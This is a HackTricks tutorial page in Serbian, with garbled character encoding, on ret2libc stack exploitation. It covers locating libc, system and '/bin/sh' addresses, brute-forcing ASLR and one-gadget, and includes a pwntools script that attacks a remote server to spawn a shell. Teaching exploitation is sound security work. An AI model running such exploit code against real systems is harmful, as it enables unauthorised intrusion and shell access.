# Ret2lib

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJE**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## **Osnovne informacije**

SuÅ¡tina **Ret2Libc** je preusmeravanje izvrÅ¡nog toka ranjivog programa ka funkciji unutar deljene biblioteke (npr. **system**, **execve**, **strcpy**) umesto izvrÅ¡avanja shell koda koji je dostavljen od strane napadaÄa na steku. NapadaÄ kreira payload koji modifikuje povratnu adresu na steku tako da pokazuje na Å¾eljenu funkciju biblioteke, dok istovremeno organizuje da svi neophodni argumenti budu pravilno postavljeni u skladu sa konvencijom pozivanja.

### **Primer koraka (simplifikovan)**

* Dobiti adresu funkcije koja se poziva (npr. system) i komandu koja se poziva (npr. /bin/sh)
* Generisati ROP lanac da se prosledi prvi argument koji pokazuje na string komande i izvrÅ¡ni tok funkciji

## PronalaÅ¾enje adresa

* PretpostavljajuÄ‡i da se `libc` koji se koristi nalazi na trenutnoj maÅ¡ini, moÅ¾ete saznati gde Ä‡e biti uÄitan u memoriju sa:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

Ako Å¾elite da proverite da li ASLR menja adresu libc-a, moÅ¾ete uraditi sledeÄ‡e:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* ZnajuÄ‡i koriÅ¡Ä‡enu libc biblioteku, takoÄ‘e je moguÄ‡e pronaÄ‡i offset do funkcije `system` pomoÄ‡u:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* ZnajuÄ‡i koriÅ¡Ä‡enu libc biblioteku, takoÄ‘e je moguÄ‡e pronaÄ‡i offset do stringa `/bin/sh` funkcije sa:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### KoriÅ¡Ä‡enje gdb-peda / GEF

ZnajuÄ‡i koriÅ¡Ä‡enu libc biblioteku, takoÄ‘e je moguÄ‡e koristiti Peda ili GEF da dobijete adresu funkcije **system**, funkcije **exit** i stringa **`/bin/sh`** :
```bash
p system
p exit
find "/bin/sh"
```
### KoriÅ¡Ä‡enje /proc/\<PID>/maps

Ako proces stvara **deÄake** svaki put kada razgovarate s njim (mreÅ¾ni server), pokuÅ¡ajte da **proÄitate** taj fajl (verovatno Ä‡e vam biti potrebno da budete root).

Ovde moÅ¾ete pronaÄ‡i **taÄno gde je uÄitan libc** unutar procesa i **gde Ä‡e biti uÄitan** za svako dete procesa.

![](<../../../.gitbook/assets/image (853).png>)

U ovom sluÄaju uÄitan je na **0xb75dc000** (Ovo Ä‡e biti bazna adresa libc-a)

## Nepoznat libc

MoguÄ‡e je da **ne znate koji libc uÄitava** binarni fajl (jer se moÅ¾da nalazi na serveru do kojeg nemate pristup). U tom sluÄaju moÅ¾ete iskoristiti ranjivost da **procurete neke adrese i pronaÄ‘ete koji libc** se koristi:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

A moÅ¾ete pronaÄ‡i Å¡ablon pwntools-a za ovo u:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### Poznati libc sa 2 ofseta

Proverite stranicu [https://libc.blukat.me/](https://libc.blukat.me/) i koristite **par adresa** funkcija unutar libc-a da biste saznali **verziju koja se koristi**.

## Bajpasovanje ASLR-a u 32 bita

Ovi napadi brute-forcinga su **korisni samo za 32-bitne sisteme**.

* Ako je eksploatacija lokalna, moÅ¾ete pokuÅ¡ati da brute-force-ujete baznu adresu libc-a (korisno za 32-bitne sisteme):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Ako napadate udaljeni server, moÅ¾ete pokuÅ¡ati **bruteforce-ovati adresu `libc` funkcije `usleep`**, prosleÄ‘ujuÄ‡i kao argument 10 (na primer). Ako server u nekom trenutku **dodatno odgovori za 10 sekundi**, pronaÅ¡li ste adresu ove funkcije.

## Jedan Gadget

IzvrÅ¡ite shell skoÄivÅ¡i na **jednu** odreÄ‘enu **adresu** u libc-u:

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## x86 Ret2lib Primer Koda

U ovom primeru ASLR bruteforce je integrisan u kod, a ranjivi binarni fajl se nalazi na udaljenom serveru:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## Primer koda za x64 Ret2lib

Proverite primer sa:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## Primer ARM64 Ret2lib

U sluÄaju ARM64, instrukcija `ret` skaÄe na lokaciju na koju pokazuje registar x30, a ne na lokaciju na koju pokazuje registar steka. Zbog toga je malo sloÅ¾enije.

TakoÄ‘e, u ARM64 instrukcija radi ono Å¡to instrukcija radi (nije moguÄ‡e skoÄiti usred instrukcija i transformisati ih u nove).

Proverite primer sa:

{% content-ref url="ret2lib-+-printf-leak-arm64.md" %}
[ret2lib-+-printf-leak-arm64.md](ret2lib-+-printf-leak-arm64.md)
{% endcontent-ref %}

## Ret-into-printf (ili puts)

Ovo omoguÄ‡ava **procurivanje informacija iz procesa** pozivanjem `printf`/`puts` sa odreÄ‘enim podacima postavljenim kao argument. Na primer, stavljanje adrese `puts` u GOT-u u izvrÅ¡avanje `puts` Ä‡e **procuriti adresu `puts` u memoriji**.

## Ret2printf

Ovo u osnovi znaÄi zloupotrebu **Ret2lib kako bi se pretvorio u ranjivost sa formatiranim stringovima za `printf`** koristeÄ‡i `ret2lib` za pozivanje printf sa vrednostima kako bi se iskoristio (zvuÄi beskorisno ali je moguÄ‡e):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## Ostali primeri i reference

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, dajuÄ‡i procurivanje adrese funkcije u libc-u, koristeÄ‡i jedan alat
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bita, ASLR omoguÄ‡en ali bez PIE-a, prvi korak je popuniti prekoraÄenje dok se ne doÄ‘e do bajta 0x00 kanara, zatim pozvati puts i procuriti ga. Sa kanarom se kreira ROP alatka za pozivanje puts kako bi procurila adresa puts iz GOT-a i zatim ROP alatka za pozivanje `system('/bin/sh')`
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bita, ASLR omoguÄ‡en, bez kanara, prekoraÄenje steka u glavnoj funkciji iz podfunkcije. ROP alatka za pozivanje puts kako bi procurila adresu puts iz GOT-a, a zatim poziva jedan alat.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 bita, bez PIE-a, bez kanara, bez relro, nx. Koristi funkciju pisanja za procurivanje adrese pisanja (libc) i poziva jedan alat.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* Koristi formatiranje stringa za procurivanje kanara sa steka i prekoraÄenje bafera za pozivanje sistema (nalazi se u GOT-u) sa adresom `/bin/sh`.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 bita, bez relro-a, bez kanara, nx, pie. Zloupotreba loÅ¡eg indeksiranja za procurivanje adresa libc-a i hipa sa steka. Zloupotreba prekoraÄenja bafera za pozivanje `system('/bin/sh')` preko ret2liba (potrebna je adresa hipa kako bi se zaobiÅ¡la provera).
